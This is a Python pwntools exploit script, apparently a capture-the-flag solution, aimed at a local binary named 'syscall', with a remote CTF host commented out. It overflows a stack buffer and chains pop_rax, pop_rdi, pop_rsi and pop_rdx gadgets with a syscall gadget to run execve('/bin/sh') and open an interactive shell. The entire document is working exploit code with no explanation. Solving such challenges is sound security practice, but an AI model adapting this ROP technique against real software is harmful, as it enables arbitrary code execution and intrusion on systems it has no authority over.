def slog(title,context): log.success(f'{title} : {hex(context)}')
from pwn import *
context.log_level = 'debug'
# p = remote("realsung.kr", 13335)
p = process('./syscall')
e = ELF("./syscall")
libc = e.libc

syscall = 0x00000000004003da
pop_rax = 0x00000000004009b2
pop_rdi = 0x0000000000401666
pop_rsi = 0x0000000000401787
pop_rdx = 0x0000000000442a76

p.recvuntil("/bin/sh : ")
binsh = int(p.recvuntil('\n'), 16)
slog('binsh', binsh)

payload = b''
payload += b'A' * (0x30 - 0x8) + p64(0x68732F6E69622F) + b'B' * 0x8

#execve("/bin/sh", NULL, NULL)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)
pause()
p.sendlineafter(b"Input > ", payload)

p.interactive()
